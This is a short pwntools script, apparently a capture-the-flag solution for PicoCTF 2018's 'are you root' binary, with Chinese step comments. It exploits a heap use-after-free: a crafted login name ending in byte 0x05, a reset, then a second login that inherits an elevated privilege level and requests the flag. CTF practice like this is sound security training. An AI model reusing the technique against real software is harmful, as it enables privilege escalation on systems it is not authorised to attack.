
from pwn import *

p = process('./PicoCTF_2018_are_you_root_patched')
log.info(f'PID = {p.pid}')

# 1. 第一次登录
p.sendlineafter(b'> ', b'login ' + b'a'*8 + b'\x05')
p.recvuntil(b'> ')
log.info('[1/4] 第一次 login 完成')
pause()

# 2. 释放用户名
p.sendline(b'reset')
p.recvuntil(b'> ')
log.info('[2/4] reset 完成')
pause()

# 3. 第二次登录
p.sendline(b'login aaa')
p.recvuntil(b'> ')
log.info('[3/4] 第二次 login 完成')
pause()

# 4. 查看权限
p.sendline(b'show')
print(p.recvuntil(b'> ').decode(errors='replace'))
log.info('[4/4] show 完成')
pause()

p.sendline(b'get-flag')
p.interactive()
